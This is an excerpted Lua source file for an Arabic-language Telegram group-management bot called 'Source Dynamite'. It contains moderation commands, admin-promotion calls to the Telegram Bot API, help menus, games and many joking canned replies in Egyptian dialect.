' }\n'..' 𖠲  الحظر  ⇇{ '..banm..' }\n\n 𖠲═───═❲[𖠲 𝚂𝙾𝚄𝚁𝙲𝙴 𝙳𝙴𝙽𝙰𝙼𝙴𝚃 𖠲 ](t.me/Lo_ga_n1)❳═───═ 𖠲\n 𖠲 قناة سورس ديـنـامـيت𖥳━━━━━ 𖥠𝐃 𝐄 𝐍 𝐀 𝐌 𝐄 𝐓𖥠 ━━━━━𖥳\n [ ❲[𖠲 𝚂𝙾𝚄𝚁𝙲𝙴 𝙳𝙴𝙽𝙰𝙼𝙴𝚃 𖠲 ](t.me/Lo_ga_n1)❳](t.me/Lo_ga_n1) \n'
send(msg.chat_id_, msg.id_,text)     
end
...
send(msg.chat_id_, msg.id_, t..'𖥳━━━━━ 𖥠𝐃 𝐄 𝐍 𝐀 𝐌 𝐄 𝐓𖥠 ━━━━━𖥳\nاضغط علي الاسم ليتم نسخه\n𖥳━━━━━ 𖥠𝐃 𝐄 𝐍 𝐀 𝐌 𝐄 𝐓𖥠 ━━━━━𖥳ٴ\n 𖠲 ❲[𖠲 𝚂𝙾𝚄𝚁𝙲𝙴 𝙳𝙴𝙽𝙰𝙼𝙴𝚃 𖠲 ](t.me/Lo_ga_n1)❳ 𖠲 ')
end
...
if num > 1000 then 
send(msg.chat_id_, msg.id_,' 𖠲تستطيع التنظيف 1000 رساله كحد اقصى') 
return false  
end  
local msgm = msg.id_
for i=1,tonumber(num) do
...
if text == ""..(database:get(bot_id..'Name:Bot') or 'ديـنـامـيت').."" then  
Namebot = (database:get(bot_id..'Name:Bot') or 'ديـنـامـيت')
local DRAGON_Msg = {
'نعم يروحي♥️🙈',
'نعم يا قلب  '..Namebot..'',
'عاوز اي من '..Namebot..'',
'دوختو  '..Namebot..'',
'انت تعرف انو بوت  '..Namebot..'  متنصب علي سورس ديـنـامـيتو🙈♥️',
'بتشقط وجي ويت 🤪',
'ايوا جاي 🙈',
'يعم هتسحر واجي 😾',
...
send(msg.chat_id_, msg.id_," 𖠲تم مسح ردود المتعدده")
end
------------------------------------------------------------------------
if text1 then 
...
send(msg.chat_id_, msg.id_,' 𖠲لا يمكنني تعديل  او وضع لقب ليس لدي صلاحيه\n 𖠲قم بترقيتي جميع الصلاحيات او صلاحية اضافه مشرف ') 
return false  
end
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n 𖠲 الـعـضو   ⇇['..data.first_name_..'](t.me/'..(data.username_ or 'textchuser')..') '
status  = '\n 𖠲 الايدي  ⇇'..result.sender_user_id_..'\n 𖠲تم ضافه {'..timsh..'} كلقب له'
send(msg.chat_id_, msg.id_, usertext..status)
https.request("https://api.telegram.org/bot"..token.."/promoteChatMember?chat_id=" .. msg.chat_id_ .. "&user_id=" ..result.sender_user_id_.."&can_change_info=false&can_delete_messages=false&can_invite_users=True&can_restrict_members=false&can_pin_messages=True&can_promote_members=false")
...
send(msg.chat_id_, msg.id_,' 𖠲وينك وين القب ') 
else
send(msg.chat_id_, msg.id_,' 𖠲لقبك هو : '..GeId.result.custom_title) 
end
end
...
send(msg.chat_id_, msg.id_,'\n 𖠲صلاحيات البوت هي\n𖥳━━━━━ 𖥠𝐃 𝐄 𝐍 𝐀 𝐌 𝐄 𝐓𖥠 ━━━━━𖥳\n 𖠲  علامة ال {✔️} تعني مفعل\n 𖠲  علامة ال {✖} تعني غير مفعل\n𖥳━━━━━ 𖥠𝐃 𝐄 𝐍 𝐀 𝐌 𝐄 𝐓𖥠 ━━━━━𖥳\n 𖠲تغير معلومات المجموعة ↞ '..INf..'\n 𖠲مسح الرسائل ↞ '..DEL..'\n 𖠲حظر المستخدمين ↞ '..REs..'\n 𖠲دعوة المستخدمين ↞ '..INv..'\n 𖠲ثتبيت الرسالة ↞ '..Pin..'\n 𖠲اضافة مشرفين ↞ '..PRo)   
end
end
...
end --الكود حصري سورس ديـنـامـيتيعني لو بكتهن راح اعرفك انت الاخذتهن
local t = "\n 𖠲المستخدم ~ ["..User_id .."] يصيح المشرفين \n𖥳━━━━━ 𖥠𝐃 𝐄 𝐍 𝐀 𝐌 𝐄 𝐓𖥠 ━━━━━𖥳\n"
k = 0
...
return send(msg.chat_id_, msg.id_," 𖠲ارسل الرد الذي اريد اضافته")
end
...
return send(msg.chat_id_, msg.id_," 𖠲ارسل الان الكلمه لمسحها ")
end
if text then  
...
send(msg.chat_id_, msg.id_," 𖠲تم حفظ الرد الاول ارسل الرد الثاني")
return false  
end  
end
if text then  
...
send(msg.chat_id_, msg.id_," 𖠲تم حفظ الرد الثاني ارسل الرد الثالث")
return false  
end  
end
if text then  
...
send(msg.chat_id_, msg.id_," 𖠲تم حفظ الرد")
return false  
end  
end
if text then
...
-------------------------------
if text == ""..(database:get(bot_id..'Name:Bot') or 'ديـنـامـيت').." غادر" or text == 'غادر' then  
...
send(msg.chat_id_, msg.id_,' رتبتك ↝ '..rtp..' ↜ 𖠲\n ') 
end
if text == "تفعيل انا مين"  then
if Constructor(msg) then  
database:set(bot_id.."my_anamen:status"..msg.chat_id_,true) 
send(msg.chat_id_, msg.id_," 𖠲تـم تـفعـيل انا مين") 
return false  
end
end
...
if not my_ph then
send(msg.chat_id_, msg.id_," 𖠲انا مين معطله") 
return false  
end
send(msg.chat_id_,msg.id_, '[نت مطوري تاج راسي 😊](t.me/Lo_ga_n1)')
return false
end
...
send(msg.chat_id_, msg.id_," 𖠲تـم تـفعـيل ردود السورس") 
return false  
end
end
...
send(msg.chat_id_,msg.id_, '[مع الف سلامه يبقلبي متجيش تاني..😹💔🎶](t.me/Lo_ga_n1)')
return false
end
...
local my_ph = database:get(bot_id.."my_GHoeq2:status"..msg.chat_id_)
if not my_ph then
send(msg.chat_id_, msg.id_," 𖠲معطله") 
return false  
end
send(msg.chat_id_,msg.id_, '[باي..😺💜](t.me/Lo_ga_n1)')
return false
end
...
send(msg.chat_id_,msg.id_, '[نزل عينك تحت كدا علشان هتخاد علي قفاك..𖠲♥️](t.me/Lo_ga_n1)')
return false
end
end
end
...
send(msg.chat_id_,msg.id_, '[انت الي حلو ياقمر..♥️🦋](t.me/Lo_ga_n1)')
return false
end
...
send(msg.chat_id_,msg.id_, '[انا عايز مح انا كمان 🥺💛](t.me/Lo_ga_n1)')
return false
end
end
end
...
send(msg.chat_id_,msg.id_, '[وحيات امك ياكبتن خدوني معاكو بيف...🥺💔](t.me/Lo_ga_n1)')
return false
end
end
end
...
send(msg.chat_id_,msg.id_, '[بتعيط تيب لي طيب..😥](t.me/Lo_ga_n1)')
return false
end
end
end
...
send(msg.chat_id_,msg.id_, '[ونجيب اشخاص ...😂😜](t.me/Lo_ga_n1)')
return false
end
end
end
...
send(msg.chat_id_,msg.id_, '[بـعشـقق .🥰❤️](t.me/Lo_ga_n1)')
return false
end
end
end
...
send(msg.chat_id_,msg.id_, '[وعليكم السلام ..🖤𖠲](t.me/Lo_ga_n1)')
return false
end
end
end
...
send(msg.chat_id_,msg.id_, '[خخخ امال ..😹](t.me/Lo_ga_n1)')
return false
end
end
end
...
send(msg.chat_id_,msg.id_, '[قامد قموده ..🌝♥️](t.me/Lo_ga_n1)')
return false
end
end
end
...
send(msg.chat_id_,msg.id_, '[انا اجمد ..𖠲💕](t.me/Lo_ga_n1)')
return false
end
end
end
...
send(msg.chat_id_,msg.id_, '[انا اجمد ..??💕](t.me/Lo_ga_n1)')
return false
end
end
end
...
send(msg.chat_id_,msg.id_, '[مش هروح ..😹👻](t.me/Lo_ga_n1)')
return false
end
end
end
...
send(msg.chat_id_,msg.id_, '[مش هتيجي مش هروح ..😹👻](t.me/Lo_ga_n1)')
return false
end
end
end
...
send(msg.chat_id_,msg.id_, '[الود كبر وبقي عندو بنت ..😻💥](t.me/Lo_ga_n1)')
return false
end
end
end
...
send(msg.chat_id_,msg.id_, '[عندو كام سنه ..😹💥](t.me/Lo_ga_n1)')
return false
end
end
end
...
send(msg.chat_id_,msg.id_, '[القمر مهو بيضكك اهوه ..𖠲💕](t.me/Lo_ga_n1)')
return false
end
end
end
...
if not my_ph then
send(msg.chat_id_, msg.id_," 𖠲اكتب تفعيل نسبه جمالي") 
return false  
end
local function getpro(extra, result, success)
if result.photos_[0] then
sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, result.photos_[0].sizes_[1].photo_.persistent_id_," 𖠲نسبه جمالك هيا ⇜ %"..result.total_count_.." يختي قمر يجدعان 𖠲💕", msg.id_, msg.id_, "md")
else
send(msg.chat_id_, msg.id_,'لا تمتلك صوره في حسابك', 1, 'md')
  end end
tdcli_function ({ ID = "GetUserProfilePhotos", user_id_ = msg.sender_user_id_, offset_ = 0, limit_ = 1 }, getpro, nil)
...
[[
🌨𖥳━━━━━ 𖥠𝐃 𝐄 𝐍 𝐀 𝐌 𝐄 𝐓𖥠 ━━━━━𖥳Use ⇨ #username 🌨
🌨𖥳━━━━━ 𖥠𝐃 𝐄 𝐍 𝐀 𝐌 𝐄 𝐓𖥠 ━━━━━𖥳iD ⇨ #id 🌨
🌨𖥳━━━━━ 𖥠𝐃 𝐄 𝐍 𝐀 𝐌 𝐄 𝐓𖥠 ━━━━━𖥳Sta ⇨  #stast 🌨
🌨𖥳━━━━━ 𖥠𝐃 𝐄 𝐍 𝐀 𝐌 𝐄 𝐓𖥠 ━━━━━𖥳Msg ⇨ #msgs 🌨
🌨𖥳━━━━━ 𖥠𝐃 𝐄 𝐍 𝐀 𝐌 𝐄 𝐓𖥠 ━━━━━𖥳NaMe ⇨ #name  🌨
]],
[[
- ᴜѕᴇʀɴᴀᴍᴇ ➣ #username .
- ᴍѕɢѕ ➣ #msgs .
...
[[
↑𖥳━━━━━ 𖥠𝐃 𝐄 𝐍 𝐀 𝐌 𝐄 𝐓𖥠 ━━━━━𖥳𝙐𝙎𝙀𝙍𝙉𝘼𝙈𝙀 ➱ #username 𖠲  
↑𖥳━━━━━ 𖥠𝐃 𝐄 𝐍 𝐀 𝐌 𝐄 𝐓𖥠 ━━━━━𖥳𝙄𝘿 ➱ #id
↑𖥳━━━━━ 𖥠𝐃 𝐄 𝐍 𝐀 𝐌 𝐄 𝐓𖥠 ━━━━━𖥳𝙍𝘼𝙉𝙆 ➱  #stast 𖠲  
↑𖥳━━━━━ 𖥠𝐃 𝐄 𝐍 𝐀 𝐌 𝐄 𝐓𖥠 ━━━━━𖥳𝙈𝘼𝙎𝙂 ➱ #msgs 𖠲  
↑𖥳━━━━━ 𖥠𝐃 𝐄 𝐍 𝐀 𝐌 𝐄 𝐓𖥠 ━━━━━𖥳𝗖𝗛 ➯  ↝@Lo_ga_n1↜ 𖠲  
]],
[[
𝟓 𝟔 𖡻 #username  ࿇🦄
?? 𝟔 𖡻 #msgs  ࿇🦄
...
if not Mod(msg) then
send(msg.chat_id_, msg.id_,'𖠲هاذا الامر خاص بالادمنيه\n𖠲ارسل {⑩} لعرض اوامر الاعضاء')
return false
end
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
...
[🎯ألعاب سورس ديـنـامـيت الاحسن في التليجرام .↑]
╾╾╾╾╾╾╾╾╾╾╾╾╾╾╸
 [𖠲 𝚂𝙾𝚄𝚁𝙲𝙴 𝙳𝙴𝙽𝙰𝙼𝙴𝚃 𖠲 ](t.me/Lo_ga_n1)
]]
keyboard = {} 
...
local Text = [[
 ...
 تحت لي في الزر الأسفل𖥳━━━━━ 𖥠𝐃 𝐄 𝐍 𝐀 𝐌 𝐄 𝐓𖥠 ━━━━━𖥳
...
send(msg.chat_id_, msg.id_," 𖠲تـم تـفعـيل مريم") 
return false  
end
end
...
if not my_ph then
send(msg.chat_id_, msg.id_," 𖠲مريم  معطله") 
return false  
end
if not database:get(bot_id..'lock:add'..msg.chat_id_) then
...
if not database:get(bot_id..'lock:add'..msg.chat_id_) then
local texting = {"طبعا دا بقلبي ♥🙄"," هحب فيه اي دا😹🙂","تؤ محصلش😹"}
send(msg.chat_id_, msg.id_, ''..texting[math.random(#texting)]..'')
end
end
...
local Teext =[[
 𖠲مرحب بيك في اوامر الوضع واضف 𖠲
𖥳━━━━━ 𖥠𝐃 𝐄 𝐍 𝐀 𝐌 𝐄 𝐓𖥠 ━━━━━𖥳 
 𖠲اوامر الوضع - اضف
𖥳━━━━━ 𖥠𝐃 𝐄 𝐍 𝐀 𝐌 𝐄 𝐓𖥠 ━━━━━𖥳
 𖠲اضف / مسح ← رد
...
𖥳━━━━━ 𖥠𝐃 𝐄 𝐍 𝐀 𝐌 𝐄 𝐓𖥠 ━━━━━𖥳
 ...
 𖠲امسح
 𖠲صلاحيه
 𖠲قائمه منع المتحركات
 𖠲قائمه منع الصور
 𖠲قائمه منع الملصقات
 𖠲مسح قائمه المنع
 𖠲المحذوفين
𖥳━━━━━ 𖥠𝐃 𝐄 𝐍 𝐀 𝐌 𝐄 𝐓𖥠 ━━━━━𖥳
 𖠲مسح  امر + الامر القديم  
𖥳━━━━━ 𖥠𝐃 𝐄 𝐍 𝐀 𝐌 𝐄 𝐓𖥠 ━━━━━𖥳
 𖠲الاوامر المضافه ( لعرض الاوامر المضافه ) 
𖥳━━━━━ 𖥠𝐃 𝐄 𝐍 𝐀 𝐌 𝐄 𝐓𖥠 ━━━━━𖥳
❲[𖠲 𝚂𝙾𝚄𝚁𝙲𝙴 𝙳𝙴𝙽𝙰𝙼𝙴𝚃 𖠲 ](t.me/Lo_ga_n1)❳ 
]]
keyboard = {} 
...
local Teext =[[
 𖠲مرحب بيك في اوامر تنزيل ورفع 𖠲
𖥳━━━━━ 𖥠𝐃 𝐄 𝐍 𝐀 𝐌 𝐄 𝐓𖥠 ━━━━━𖥳 
 𖠲اوامر تنزيل ورفع
𖥳━━━━━ 𖥠𝐃 𝐄 𝐍 𝐀 𝐌 𝐄 𝐓𖥠 ━━━━━𖥳 
 𖠲مميز
...
𖥳━━━━━ 𖥠𝐃 𝐄 𝐍 𝐀 𝐌 𝐄 𝐓𖥠 ━━━━━𖥳
 ...
 𖠲تغير رد الادمن + اسم
 𖠲تغير رد المميز + اسم
 𖠲تغير رد الـعـضو  + اسم
 𖠲تغير امر الاوامر
 𖠲تغير امر م1 ~ الئ م10
𖥳━━━━━ 𖥠𝐃 𝐄 𝐍 𝐀 𝐌 𝐄 𝐓𖥠 ━━━━━𖥳 
 𖠲اوامر المجموعه 📢 .
𖥳━━━━━ 𖥠𝐃 𝐄 𝐍 𝐀 𝐌 𝐄 𝐓𖥠 ━━━━━𖥳
 𖠲استعاده الاوامر 
 𖠲تحويل كالاتي⇜ بالرد على صوره او ملصق او صوت او بصمه بالامر ← تحويل 
 𖠲صيح ~ تاك ~ المميزين : الادمنيه : المدراء : المنشئين : المنشئين الاساسين
 𖠲كشف القيود
 𖠲تعين الايدي
 𖠲تغير الايدي
 𖠲الحساب + ايدي الحساب
 ...
 𖠲الغاء كتم + حظر + تقيد ~ بالرد و معرف و ايدي
 𖠲تقيد ~ كتم + الرقم + ساعه
 𖠲تقيد ~ كتم + الرقم + يوم
 𖠲تقيد ~ كتم + الرقم + دقيقه
 𖠲تثبيت ~ الغاء تثبيت
 𖠲الترحيب
 𖠲الغاء تثبيت الكل
 𖠲كشف البوتات
...
local Teext =[[
🚨 اهلا بك في قسم الاوامر ..↑𖥳━━━━━ 𖥠𝐃 𝐄 𝐍 𝐀 𝐌 𝐄 𝐓𖥠 ━━━━━𖥳
 اختر الامر الذي تريدها .↑𖥳━━━━━ 𖥠𝐃 𝐄 𝐍 𝐀 𝐌 𝐄 𝐓𖥠 ━━━━━𖥳
ده من الازرار بلاسفل . 𖥳━━━━━ 𖥠𝐃 𝐄 𝐍 𝐀 𝐌 𝐄 𝐓𖥠 ━━━━━𖥳
╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╸
❲[𖠲 𝚂𝙾𝚄𝚁𝙲𝙴 𝙳𝙴𝙽𝙰𝙼𝙴𝚃 𖠲 ](t.me/Lo_ga_n1)❳ 
]]
keyboard = {} 
...
local Teext =[[
 𖠲بك في مميزات سورس ديـنـامـيت𖠲  
 𖠲مميزات الخاصه بسورس𖠲 
]]
keyboard = {} 
keyboard.inline_keyboard = {
...
if Text == '/help30' then
local Text = 'لتجربه العلبه عليك ان تكتب البات في الشات𖠲↯'
...
if Text == '/help31' then
local Text = 'لتجربه العلبه عليك ان تكتب المختلف في الشات𖠲↯'
https.request("https://api.telegram.org/bot"..token.."/answerCallbackQuery?callback_query_id="..data.id_.."&text="..URL.escape(Text).."&show_alert=true")
return false
end
if Text == '/help32' then
local Text = 'لتجربه العلبه عليك ان تكتب التخمين في الشات𖠲↯'
https.request("https://api.telegram.org/bot"..token.."/answerCallbackQuery?callback_query_id="..data.id_.."&text="..URL.escape(Text).."&show_alert=true")
return false
end
if Text == '/help33' then
local Text = 'لتجربه العلبه عليك ان تكتب الاسرع في الشات𖠲↯'
https.request("https://api.telegram.org/bot"..token.."/answerCallbackQuery?callback_query_id="..data.id_.."&text="..URL.escape(Text).."&show_alert=true")
return false
end
if Text == '/help34' then
local Text = 'لتجربه العلبه عليك ان تكتب الحزوه في الشات𖠲↯'
https.request("https://api.telegram.org/bot"..token.."/answerCallbackQuery?callback_query_id="..data.id_.."&text="..URL.escape(Text).."&show_alert=true")
return false
end
if Text == '/help35' then
local Text = 'لتجربه العلبه عليك ان تكتب امثله في الشات𖠲↯'
https.request("https://api.telegram.org/bot"..token.."/answerCallbackQuery?callback_query_id="..data.id_.."&text="..URL.escape(Text).."&show_alert=true")
return false
end
if Text == '/help36' then
local Text = 'لتجربه العلبه عليك ان تكتب مريم في الشات𖠲↯'
https.request("https://api.telegram.org/bot"..token.."/answerCallbackQuery?callback_query_id="..data.id_.."&text="..URL.escape(Text).."&show_alert=true")
return false
end
if Text == '/help37' then
local Text = 'لتجربه العلبه عليك ان تكتب الرياضيات في الشات𖠲↯'
https.request("https://api.telegram.org/bot"..token.."/answerCallbackQuery?callback_query_id="..data.id_.."&text="..URL.escape(Text).."&show_alert=true")
return false
end
if Text == '/help38' then
local Text = 'لتجربه العلبه عليك ان تكتب السمايلات في الشات𖠲↯'
https.request("https://api.telegram.org/bot"..token.."/answerCallbackQuery?callback_query_id="..data.id_.."&text="..URL.escape(Text).."&show_alert=true")
return false
end
if Text == '/help39' then
local Text = 'لتجربه العلبه عليك ان تكتب العكس في الشات𖠲↯'
https.request("https://api.telegram.org/bot"..token.."/answerCallbackQuery?callback_query_id="..data.id_.."&text="..URL.escape(Text).."&show_alert=true")
return false
end
if Text == '/help40' then
local Text = 'لتجربه العلبه عليك ان تكتب الانكليزي في الشات𖠲↯'
https.request("https://api.telegram.org/bot"..token.."/answerCallbackQuery?callback_query_id="..data.id_.."&text="..URL.escape(Text).."&show_alert=true")
return false
end
if Text == '/help41' then
local Text = 'لتجربه العلبه عليك ان تكتب المعاني في الشات𖠲↯'
https.request("https://api.telegram.org/bot"..token.."/answerCallbackQuery?callback_query_id="..data.id_.."&text="..URL.escape(Text).."&show_alert=true")
return false
end
if Text == '/help42' then
local Text = 'لتجربه العلبه عليك ان تكتب عقاب في الشات𖠲↯'
https.request("https://api.telegram.org/bot"..token.."/answerCallbackQuery?callback_query_id="..data.id_.."&text="..URL.escape(Text).."&show_alert=true")
return false
end
if Text == '/help47' then
local Text = 'لتجربه العلبه عليك ان تكتب كشف الكذب في الشات𖠲↯'
https.request("https://api.telegram.org/bot"..token.."/answerCallbackQuery?callback_query_id="..data.id_.."&text="..URL.escape(Text).."&show_alert=true")
return false
end
...
local Teext =[[
 𖠲مرحب  بك في مميزات سورس ديـنـامـيت 𖠲
 𖠲 مميزات الخاصه بسورس 𖠲
]]
keyboard = {} 
keyboard.inline_keyboard = {
{{text = 'تويت', callback_data="/help12"},{text = 'تويت بالصور', callback_data="/help56"}},   
...
if Text == '/help12' then
local Text = 'لتجربه العلبه عليك ان تكتب تويت في الشات𖠲↯'
https.request("https://api.telegram.org/bot"..token.."/answerCallbackQuery?callback_query_id="..data.id_.."&text="..URL.escape(Text).."&show_alert=true")
return false
end
if Text == '/help13' then
local Text = 'لتجربه العلبه عليك ان تكتب انصحني في الشات𖠲↯'
https.request("https://api.telegram.org/bot"..token.."/answerCallbackQuery?callback_query_id="..data.id_.."&text="..URL.escape(Text).."&show_alert=true")
return false
end
if Text == '/help14' then
local Text = 'لتجربه العلبه عليك ان تكتب الصراحه في الشات𖠲↯'
https.request("https://api.telegram.org/bot"..token.."/answerCallbackQuery?callback_query_id="..data.id_.."&text="..URL.escape(Text).."&show_alert=true")
return false
end
if Text == '/help15' then
local Text = 'لتجربه العلبه عليك ان تكتب رزله في الشات𖠲↯'
https.request("https://api.telegram.org/bot"..token.."/answerCallbackQuery?callback_query_id="..data.id_.."&text="..URL.escape(Text).."&show_alert=true")
return false
end
if Text == '/help16' then
local Text = 'لتجربه العلبه عليك ان تكتب بتكره دا في الشات𖠲↯'
https.request("https://api.telegram.org/bot"..token.."/answerCallbackQuery?callback_query_id="..data.id_.."&text="..URL.escape(Text).."&show_alert=true")
return false
end
if Text == '/help17' then
local Text = 'للاستماع للاغاني عليك ان تكتب غنيلي في الشات𖠲↯'
https.request("https://api.telegram.org/bot"..token.."/answerCallbackQuery?callback_query_id="..data.id_.."&text="..URL.escape(Text).."&show_alert=true")
return false
end
if Text == '/help18' then
local Text = 'لتجربه العلبه عليك ان تكتب نسبه جمالي في الشات𖠲↯'
https.request("https://api.telegram.org/bot"..token.."/answerCallbackQuery?callback_query_id="..data.id_.."&text="..URL.escape(Text).."&show_alert=true")
return false
end
if Text == '/help19' then
local Text = 'لتجربه العلبه عليك ان تكتب كتبات في الشات𖠲↯'
https.request("https://api.telegram.org/bot"..token.."/answerCallbackQuery?callback_query_id="..data.id_.."&text="..URL.escape(Text).."&show_alert=true")
return false
end
if Text == '/help20' then
local Text = 'لتجربه العلبه عليك ان تكتب لو خيروك في الشات𖠲↯'
https.request("https://api.telegram.org/bot"..token.."/answerCallbackQuery?callback_query_id="..data.id_.."&text="..URL.escape(Text).."&show_alert=true")
return false
end
if Text == '/help21' then
local Text = 'لتجربه العلبه عليك ان تكتب حروف في الشات𖠲↯'
https.request("https://api.telegram.org/bot"..token.."/answerCallbackQuery?callback_query_id="..data.id_.."&text="..URL.escape(Text).."&show_alert=true")
return false
end
if Text == '/help22' then
local Text = 'لتجربه العلبه عليك ان تكتب رد عليه يابوت في الشات𖠲↯'
https.request("https://api.telegram.org/bot"..token.."/answerCallbackQuery?callback_query_id="..data.id_.."&text="..URL.escape(Text).."&show_alert=true")
return false
end
if Text == '/help23' then
local Text = 'لتجربه العلبه عليك ان تكتب نكته في الشات𖠲↯'
https.request("https://api.telegram.org/bot"..token.."/answerCallbackQuery?callback_query_id="..data.id_.."&text="..URL.escape(Text).."&show_alert=true")
return false
end
if Text == '/help24' then
local Text = 'لتحميل من المواقع عليك ان تكتب اليتيوب في الشات𖠲↯'
https.request("https://api.telegram.org/bot"..token.."/answerCallbackQuery?callback_query_id="..data.id_.."&text="..URL.escape(Text).."&show_alert=true")
return false
end
if Text == '/help25' then
local Text = 'لتجربه العلبه عليك ان تكتب لو خيروك بالصور في الشات𖠲↯'
https.request("https://api.telegram.org/bot"..token.."/answerCallbackQuery?callback_query_id="..data.id_.."&text="..URL.escape(Text).."&show_alert=true")
return false
end
if Text == '/help56' then
local Text = 'لتجربه العلبه عليك ان تكتب تويت بالصور في الشات𖠲↯'
https.request("https://api.telegram.org/bot"..token.."/answerCallbackQuery?callback_query_id="..data.id_.."&text="..URL.escape(Text).."&show_alert=true")
return false
end
--- callback added
...
local Name_Bot = (database:get(bot_id..'Name:Bot') or 'ديـنـامـيت')
...
numj = {"اما قله ادب صحيح كلو كدب فى كدب💔😔"," ده مظبوط🙂😹"," اقلك الكلام ده كدب واللى قالولك كداب وانت كداب واللى بيتفرج كمان كداب🤝😂"," ده برجوله وموثق كمان❤️😁","فعلا بتتكلم صح🤗","يجدع قول كلام غير دا😹","احس هل شي كذب𖠲💕","طب عيني ف عينك كدا ??","انت صح",};
sendnuj = numj[math.random(#numj)]
xl = ' ⟨  '..text..'  ⟩ \n '..sendnuj..'.'
send(msg.chat_id_, msg.id_,xl) 
...
if DRAGON1_Msg then    
send(msg.chat_id_, msg.id_," 𖠲 "..DRAGON1_Msg)
